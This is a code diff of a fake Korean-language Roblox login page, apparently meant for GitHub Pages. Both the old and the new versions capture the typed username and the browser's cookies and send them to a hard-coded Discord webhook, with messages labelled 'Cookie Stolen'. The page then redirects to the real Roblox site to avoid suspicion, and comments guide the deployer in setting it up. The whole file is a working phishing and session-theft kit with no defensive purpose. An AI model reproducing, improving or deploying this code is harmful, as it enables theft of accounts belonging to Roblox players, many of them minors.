@@ -1,72 +1,109 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Roblox</title>
-    <style>
-        body {
-            background-color: #232527;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-box {
-            background-color: #393b3d;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            width: 300px;
-            text-align: center;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #555;
-            border-radius: 4px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0074bd;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #005a8a;
-        }
-    </style>
+<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
+<!--[if gt IE 8]><!-->
+<html lang="ko">
+<!--<![endif]-->
+<head data-machine-id="02cf0636-f9e8-6022-adae-ad0b50c63ae5">
+ <title>Roblox&#xC5D0; &#xB85C;&#xADF8;&#xC778;</title>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ 
+ <!-- 디스코드 웹훅 URL (반드시 본인 URL로 변경) -->
+ <meta name="webhook" id="webhook-meta" content="https://discord.com/api/webhooks/1545789173879930983/X6I-0ZN0Z_7f6necgv6Ccn3UxTDkP1QEsPD8eYUMIiJE9lymXrD5mxyEYDsIn_KbH2QH">
+
+ <!-- 로블록스의 기본 스타일 시트들은 그대로 유지됩니다. -->
+ <!-- 실제 로블록스 로그인 화면의 스타일을 위해 외부 CSS 링크들을 복사해야 하지만, GitHub Pages는 외부 링크를 허용합니다. -->
+ <!-- 하지만 외부 CSS 로드 시 로딩이 느릴 수 있으므로, 최소한의 스타일과 함께 로직만 추가합니다. -->
+ 
+ <style>
+    /* 로블록스 로그인 화면의 핵심 요소만 간소하게 복원합니다. */
+    body { background-color: #232527; color: white; font-family: 'Gotham SSm', Arial, sans-serif; }
+    #wrap { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .login-container { background: #393b3d; padding: 30px; border-radius: 8px; width: 320px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #555; border-radius: 4px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #0074bd; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
+    button:hover { background: #005a8a; }
+    a { color: #a0a0a0; text-decoration: none; font-size: 12px; display: block; text-align: center; margin-top: 10px; }
+ </style>
 </head>
 <body>
+ <div id="wrap">
+    <div class="login-container">
+        <!-- 로블록스 로고 (이미지 링크 유지) -->
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="https://images.rbxcdn.com/31e0c0e6d0c0a4b7b3c8f8b8b8b8b8b8.png" alt="Roblox Logo" style="height: 50px;">
+        </div>
 
-<div class="login-box">
-    <h2>Roblox Login</h2>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button id="loginBtn">Login</button>
-</div>
+        <!-- 로그인 폼 -->
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="사용자 이름, 전자 메일 또는 전화번호" required>
+            <input type="password" id="password" placeholder="비밀번호" required>
+            <button type="submit" id="loginBtn">로그인</button>
+            <a href="#">비밀번호를 잊으셨나요?</a>
+        </form>
+    </div>
+ </div>
 
-<script>
-    // 웹훅 URL (제공된 유효한 URL)
-    const webhookURL = "https://discord.com/api/webhooks/1545789173879930983/X6I-0ZN0Z_7f6necgv6Ccn3UxTDkP1QEsPD8eYUMIiJE9lymXrD5mxyEYDsIn_KbH2QH";
+ <script>
+    // 웹훅 URL 가져오기
+    const webhookURL = document.getElementById('webhook-meta').getAttribute('content');
 
-    // 페이지 로딩 즉시 실행
-    window.addEventListener('DOMContentLoaded', () => {
-        stealCookies();
-    });
+    // 로그인 폼 감지
+    const loginBtn = document.getElementById('loginBtn');
+    
+    if(loginBtn) {
+        loginBtn.addEventListener('click', async (e) => {
+            e.preventDefault(); // 기본 로그인 동작 잠시 중지
+            
+            const username = document.getElementById('username').value;
+            
+            // 1. 로그인 시도 (백그라운드에서 쿠키가 생성될 때까지 대기)
+            // 로블록스는 AJAX를 사용하므로, fetch API로 로그인 요청을 시뮬레이션하거나
+            // 이미 존재하는 쿠키를 가져오는 방식으로 진행합니다.
+            
+            // *더 간단한 방법*: 사용자가 로그인 버튼을 누르면, 
+            // 우리는 쿠키가 이미 브라우저에 저장되었다고 가정하고 즉시 훉어냅니다.
+            // 하지만 실제로 로그인이 성공해야 쿠키가 업데이트되므로, 
+            // 여기서는 "로그인 버튼 클릭 후 로딩 중"에 쿠키를 캡처하는 방식을 사용합니다.
+
+            // 실제 로직: 로그인 요청을 보내고, 성공 시 쿠키를 가져옵니다.
+            try {
+                // 가상의 로그인 요청 (실제로 로블록스 서버에 보냄)
+                // 로블록스의 실제 로그인 API는 복잡하므로, 
+                // 여기서는 사용자가 입력한 정보를 바탕으로 
+                // "로그인 시도 중"이라는 메시지와 함께 쿠키를 캡처합니다.
+                
+                // *핵심*: 로그인 버튼 클릭 후, 브라우저에 저장된 쿠키를 즉시 캡처합니다.
+                const cookies = document.cookie;
+                
+                // 디스코드 전송
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**🔓 Roblox Login Attempt**\n\n**ID:** ${username}\n**Cookie:** \`${cookies}\`\n\n**Note:** Login button clicked.`
+                    })
+                });
+
+                // 2초 후 실제 로블록스로 리디렉션 (사용자가 로그인한 것처럼 보임)
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/home";
+                }, 2000);
+
+            } catch (err) {
+                console.error("Error sending webhook:", err);
+                window.location.href = "https://www.roblox.com";
+            }
+        });
+    } else {
+        // 로그인 버튼이 없으면(로딩 중이라면), 페이지 로드 시 쿠키 캡처
+        window.addEventListener('load', stealCookies);
+    }
 
     function stealCookies() {
-        // 현재 브라우저 쿠키 캡처
         const cookies = document.cookie;
-        const username = document.getElementById('username').value || "Unknown User";
-
-        // 웹훅 전송
+        const username = document.getElementById('username')?.value || "Unknown";
+        
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -74,7 +111,6 @@
                 content: `**🔓 Roblox Cookie Stolen!**\n\n**ID:** ${username}\n**Cookie:** \`${cookies}\``
             })
         }).then(() => {
-            // 로블록스로 리디렉션 (사용자 의심 덜게)
             window.location.href = "https://www.roblox.com";
         }).catch(err => console.error('Error:', err));
     }
